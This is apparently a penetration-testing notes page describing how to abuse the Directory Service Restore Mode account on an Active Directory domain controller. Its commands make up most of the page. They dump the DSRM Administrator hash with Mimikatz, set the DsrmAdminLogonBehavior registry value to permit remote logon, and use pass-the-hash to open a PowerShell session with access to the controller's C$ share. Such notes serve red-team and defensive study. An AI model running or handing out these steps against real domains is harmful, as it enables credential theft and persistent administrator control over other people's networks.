---
description: DSRM (Directory Service Restore Mode)
---

# DSRM (Directory Service Restore Mode)

> There is a local administrator on every DC called "Administrator" whose password is the DSRM password. It is the safe mode for any DC (when booted in safe mode).

**Note:** By default, we can not log using that user, but we can change the behavior of that user to permit remotely login into the DC as an Administrator. This is dangerous for real word environments, since we are downgrading the security. Take care.

### Abusing DSRM

1. Dump DSRM password (needs DA privs).

```bash
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName $DC_COMPUTER_NAME #The user we are looking for is the "Administrator".
```

1. Create a new registry hive:

```bash
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD -Verbose
```

1. Check if it is applied:

```bash
Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" #Value "DsrmAdminLogonBehavior" should be set at 2.

#If not set, use:
Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2
```

1. Use OPTH to get access:

```bash
#Note the domain property, it should be the DC hostname!!
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:$DC_MACHINE_NAME /user:Administrator /ntlm:$NTLM_HASH /run:powershell.exe"'

#Now we should have access to the DC:
ls \\$DC_MACHINE_NAME\c$
```
